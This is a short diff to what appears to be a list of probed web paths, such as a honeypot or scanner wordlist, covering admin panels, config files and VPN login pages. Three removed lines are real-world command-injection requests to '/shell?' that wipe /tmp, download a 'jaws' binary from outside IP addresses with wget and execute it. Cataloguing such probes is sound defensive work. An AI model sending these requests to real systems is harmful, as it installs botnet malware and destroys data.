@@ -137,7 +137,6 @@
 /.well-known/security.txt
 /portal/redlion
 /.git/config
-/shell?cd+/tmp;rm+-rf+*;wget+167.71.210.63/jaws;sh+/tmp/jaws
 /manager/html
 /cluster/list.query
 /conf/.env
@@ -192,7 +191,7 @@
 /aaa9
 /aab8
 /stalker_portal/server/tools/auth_simple.php
-/shell?cd+/tmp;rm+-rf+*;wget+45.12.253.180/jaws;sh+/tmp/jaws
+/shell?
 /phpmyadmin/index.php
 /pmd/index.php
 /phpmyadmin4.8.5/index.php
@@ -207,4 +206,11 @@
 /password.php
 /info.php
 /admin/config.php
-/shell?cd+/tmp;rm+-rf+*;wget+121.62.21.23/jaws;sh+/tmp/jaws
+/auth.html
+/api/sonicos/auth
+/sslvpnLogin.html
+/auth1.html
+/api/sonicos/tfa
+/openapi.json
+/login.html
+/Autodiscover/owa/
